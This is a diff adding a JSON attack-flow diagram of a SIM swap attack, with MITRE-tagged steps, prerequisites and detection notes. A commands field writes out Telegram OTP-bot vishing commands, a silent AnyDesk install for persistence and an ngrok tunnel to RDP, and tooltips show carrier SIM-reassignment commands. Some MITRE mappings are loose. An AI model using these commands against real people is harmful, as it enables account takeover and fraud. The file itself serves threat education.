@@ -1,0 +1,358 @@
+{
+  "title": "Telco SIM Swap Attack",
+  "description": "Adversary hijacks a victim's mobile phone number to intercept SMS-based Multi-Factor Authentication (MFA) codes.",
+  "version": "3.0",
+  "viewport": {
+    "zoom": 1.2630665969238906,
+    "pan": {
+      "x": 192.18266760234218,
+      "y": 190.12919428573267
+    }
+  },
+  "shortDescription": "Hijacking phone numbers to bypass SMS MFA",
+  "tags": [
+    "SIM_Swapping",
+    "Social_Engineering",
+    "MFA_Bypass",
+    "Account_Takeover",
+    "Scattered_Spider",
+    "LAPSUS$",
+    "Identity_Theft",
+    "Telecommunications"
+  ],
+  "metadata": {
+    "descriptionHtml": "The SIM Swap Attack (or SIM hijacking) is a technique where an attacker fraudulently transfers a victim's phone number to a SIM card under their control. This effectively decouples the victim's digital identity from their physical device.By controlling the phone number, the attacker can intercept SMS-based Two-Factor Authentication (2FA) codes and password reset links, granting them access to high-value accounts like banking, cryptocurrency exchanges, and enterprise Identity Providers (e.g., Okta, Microsoft Entra ID).Reconnaissance: Attacker purchases 'Fullz' (PII) to pass carrier security checks.Exploitation: Attacker contacts the carrier (social engineering) or uses an insider ('plug') to provision a new SIM.Network Update: The carrier's HLR/HSS database updates the routing, disconnecting the victim and connecting the attacker.Account Takeover: Attacker triggers password resets, intercepts the SMS OTP, and compromises the target account.",
+    "commandsBlock": "# Example: Using Telegram OTP Bot (SMSRanger) to socially engineer a code\n# The bot calls the victim posing as 'PayPal Support'\n/call 14155550199 paypal_suspicious_activity\n\n# Example: BloodOTPbot usage to prime the victim via SMS first\n/sms 14155550199 PayPalsender \"We detected a login from Russia...\"\n/otp 14155550199 paypal\n\n# Example: Installing persistence after access (AnyDesk)\n$ AnyDesk.exe --install \"C:\\ProgramData\\AnyDesk\" --silent\n\n# Example: Tunneling for C2 access\n$ ngrok tcp 3389",
+    "prerequisites": [
+      "Target PII ('Fullz') for carrier verification",
+      "Target account protected by SMS-based MFA",
+      "Blank SIM card compatible with victim's carrier",
+      "Insider contact ('plug') or social engineering script"
+    ],
+    "attackerGains": [
+      "Interception of all incoming SMS and voice calls",
+      "Bypass of SMS-based Multi-Factor Authentication",
+      "Ability to reset passwords via SMS recovery",
+      "Initial access to enterprise environments"
+    ],
+    "detectionNotes": [
+      "Sudden loss of cellular service ('No Service') on victim device",
+      "Carrier API query showing 'last_sim_change_date' < 24 hours",
+      "Password resets followed immediately by MFA method changes",
+      "Login attempts from anonymous IPs or unexpected locations"
+    ],
+    "mitreCategories": [
+      "T1451",
+      "T1598",
+      "T1621",
+      "T1589.001",
+      "T1098"
+    ],
+    "extraInfo": [
+      "MITRE T1451 - SIM Card Swap",
+      "CISA Advisory AA23-320A - Scattered Spider",
+      "Scattered Spider / UNC3944 - Threat Group Profile",
+      "FCC 23-95 - Customer Protection Rules"
+    ]
+  },
+  "entities": [
+    {
+      "id": "attacker",
+      "label": "Threat Actor",
+      "position": {
+        "x": 45.339542841778275,
+        "y": -11.85097179732083
+      },
+      "icon": "IconAttacker",
+      "type": "node"
+    },
+    {
+      "id": "attacker_infra",
+      "label": "Attacker Infrastructure",
+      "position": {
+        "x": 81.39998508906241,
+        "y": 385.506654812434
+      },
+      "icon": "IconServer",
+      "type": "container",
+      "width": 300,
+      "height": 250,
+      "style": "dashed_border",
+      "members": [
+        "otp_bot_service",
+        "attacker_phone"
+      ]
+    },
+    {
+      "id": "otp_bot_service",
+      "label": "Telegram OTP Bot",
+      "position": {
+        "x": -24.280555419390318,
+        "y": 356.5379496463784
+      },
+      "icon": "IconCode",
+      "type": "node"
+    },
+    {
+      "id": "attacker_phone",
+      "label": "Attacker Device (New SIM)",
+      "position": {
+        "x": 164.58052559751513,
+        "y": 393.4753599784896
+      },
+      "icon": "IconWorkstation",
+      "type": "node"
+    },
+    {
+      "id": "carrier_network",
+      "label": "Telecommunications Provider",
+      "position": {
+        "x": 722.3087785219515,
+        "y": 98.64740084606521
+      },
+      "icon": "IconCloud",
+      "type": "container",
+      "width": 400,
+      "height": 300,
+      "style": "dashed_border",
+      "members": [
+        "carrier_support",
+        "carrier_crm",
+        "hlr_database"
+      ]
+    },
+    {
+      "id": "carrier_support",
+      "label": "Support Agent / Insider",
+      "position": {
+        "x": 636.8087785219515,
+        "y": 13.147400846065231
+      },
+      "icon": "IconUser",
+      "type": "node"
+    },
+    {
+      "id": "carrier_crm",
+      "label": "Carrier CRM",
+      "position": {
+        "x": 836.8087785219515,
+        "y": 13.147400846065231
+      },
+      "icon": "IconServer",
+      "type": "node"
+    },
+    {
+      "id": "hlr_database",
+      "label": "HLR/HSS Database",
+      "position": {
+        "x": 674.2625911772786,
+        "y": 209.85911038196008
+      },
+      "icon": "IconDatabase",
+      "type": "node"
+    },
+    {
+      "id": "internet_zone",
+      "label": "Public Internet",
+      "position": {
+        "x": 383.31778689136394,
+        "y": 140.66520510669307
+      },
+      "icon": "IconCloud",
+      "type": "container",
+      "width": 300,
+      "height": 200,
+      "style": "dashed_border",
+      "members": [
+        "identity_provider"
+      ]
+    },
+    {
+      "id": "identity_provider",
+      "label": "Identity Provider (Okta/Entra)",
+      "position": {
+        "x": 346.03412962559037,
+        "y": 104.06664502065156
+      },
+      "icon": "IconCloud",
+      "type": "node"
+    },
+    {
+      "id": "victim_env",
+      "label": "Victim Environment",
+      "position": {
+        "x": 500,
+        "y": 490.5
+      },
+      "icon": "IconWorkstation",
+      "type": "container",
+      "width": 300,
+      "height": 200,
+      "style": "dashed_border",
+      "members": [
+        "victim_phone"
+      ]
+    },
+    {
+      "id": "victim_phone",
+      "label": "Victim Mobile Device",
+      "position": {
+        "x": 500,
+        "y": 480
+      },
+      "icon": "IconWorkstation",
+      "type": "node"
+    }
+  ],
+  "visibility": {
+    "attacker": {
+      "start": 0,
+      "end": 100
+    },
+    "attacker_infra": {
+      "start": 0,
+      "end": 100
+    },
+    "carrier_network": {
+      "start": 0,
+      "end": 100
+    },
+    "internet_zone": {
+      "start": 0,
+      "end": 100
+    },
+    "victim_env": {
+      "start": 0,
+      "end": 100
+    },
+    "attacker_phone": {
+      "start": 5,
+      "end": 100
+    }
+  },
+  "steps": [
+    {
+      "id": 1,
+      "name": "Acquire 'Fullz' (PII)",
+      "mitre": {
+        "id": "T1589.001",
+        "tactic": "Reconnaissance",
+        "technique": "Gather Victim Identity Information"
+      },
+      "type": "edge",
+      "from": "attacker",
+      "to": "otp_bot_service",
+      "icon": "IconSearch",
+      "tooltip": "Attacker loads victim PII (SSN, DOB, Address) into tools or prepares for vishing"
+    },
+    {
+      "id": 2,
+      "name": "Social Engineering / Vishing",
+      "mitre": {
+        "id": "T1598",
+        "tactic": "Reconnaissance",
+        "technique": "Phishing for Information"
+      },
+      "type": "edge",
+      "from": "attacker",
+      "to": "carrier_support",
+      "icon": "IconUser",
+      "tooltip": "Attacker impersonates victim via phone/chat or bribes an insider ('plug') to initiate swap"
+    },
+    {
+      "id": 3,
+      "name": "Provisioning Request",
+      "type": "edge",
+      "from": "carrier_support",
+      "to": "carrier_crm",
+      "icon": "IconTerminal",
+      "tooltip": "Support agent enters the new ICCID (SIM card ID) into the carrier's CRM system",
+      "cli": "UPDATE_SUBSCRIBER --msisdn 14155550199 --new_iccid 8901..."
+    },
+    {
+      "id": 4,
+      "name": "Update Location (HSS)",
+      "mitre": {
+        "id": "T1451",
+        "tactic": "Initial Access",
+        "technique": "SIM Card Swap"
+      },
+      "type": "edge",
+      "from": "carrier_crm",
+      "to": "hlr_database",
+      "icon": "IconDatabase",
+      "tooltip": "CRM pushes 'Update Location' or 'Change IMSI' command to the core network HLR/HSS",
+      "cli": "HGICI:MSISDN=14155550199,NIMSI=..."
+    },
+    {
+      "id": 5,
+      "name": "De-register Device",
+      "mitre": {
+        "id": "T1498",
+        "tactic": "Impact",
+        "technique": "Network Denial of Service"
+      },
+      "type": "edge",
+      "from": "hlr_database",
+      "to": "victim_phone",
+      "icon": "IconDisconnect",
+      "tooltip": "Network detaches the victim's SIM. Victim device displays 'No Service'"
+    },
+    {
+      "id": 6,
+      "name": "Register New SIM",
+      "mitre": {
+        "id": "T1098",
+        "tactic": "Persistence",
+        "technique": "Account Manipulation"
+      },
+      "type": "edge",
+      "from": "hlr_database",
+      "to": "attacker_phone",
+      "icon": "IconConnect",
+      "tooltip": "Attacker's SIM card authenticates with the network and captures the phone number"
+    },
+    {
+      "id": 7,
+      "name": "Trigger Password Reset",
+      "mitre": {
+        "id": "T1621",
+        "tactic": "Credential Access",
+        "technique": "Multi-Factor Authentication Request Generation"
+      },
+      "type": "edge",
+      "from": "attacker",
+      "to": "identity_provider",
+      "icon": "IconCloud",
+      "tooltip": "Attacker initiates 'Forgot Password' flow on target service (Okta, Gmail, Bank)"
+    },
+    {
+      "id": 8,
+      "name": "Send SMS OTP",
+      "mitre": {
+        "id": "T1111",
+        "tactic": "Credential Access",
+        "technique": "Multi-Factor Authentication Interception"
+      },
+      "type": "edge",
+      "from": "identity_provider",
+      "to": "attacker_phone",
+      "icon": "IconToken",
+      "tooltip": "IdP sends SMS OTP to the phone number, which now routes to the Attacker"
+    },
+    {
+      "id": 9,
+      "name": "Authenticate & Takeover",
+      "mitre": {
+        "id": "T1550.004",
+        "tactic": "Defense Evasion",
+        "technique": "Use Alternate Authentication Material: Web Session Cookie"
+      },
+      "type": "edge",
+      "from": "attacker_phone",
+      "to": "identity_provider",
+      "icon": "IconStolenToken",
+      "tooltip": "Attacker enters the intercepted OTP and resets the password/MFA"
+    }
+  ]
+}
